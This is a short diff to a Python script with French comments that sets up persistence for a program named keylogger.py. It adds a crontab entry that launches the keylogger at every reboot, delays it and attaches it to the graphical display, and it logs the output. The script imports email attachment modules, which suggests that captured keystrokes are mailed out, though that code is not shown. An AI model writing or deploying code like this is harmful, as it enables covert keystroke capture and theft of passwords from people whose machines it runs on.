@@ -6,18 +6,16 @@ from email.mime.multipart import MIMEMultipart
 from email.mime.text import MIMEText
 from email.mime.base import MIMEBase
 from email import encoders
+import subprocess
 
 
 #--------DÉBUT TÂCHES PROGRAMMÉES---------------
 
-import os
-import subprocess
-
 # Chemin vers le script Python
 python_script = "/home/kali/Downloads/keylogger.py"
 
-# Commande crontab pour exécuter le script Python au démarrage
-cron_job = f"@reboot /usr/bin/python3 {python_script}"
+# Commande crontab pour exécuter le script Python au démarrage avec temporisation et affichage graphique
+cron_job = f"@reboot sleep 30 && DISPLAY=:0 /usr/bin/python3 {python_script} >> /home/kali/cronlog.txt 2>&1"
 
 # Obtenir la crontab actuelle de l'utilisateur
 current_cron = subprocess.run(['crontab', '-l'], capture_output=True, text=True)
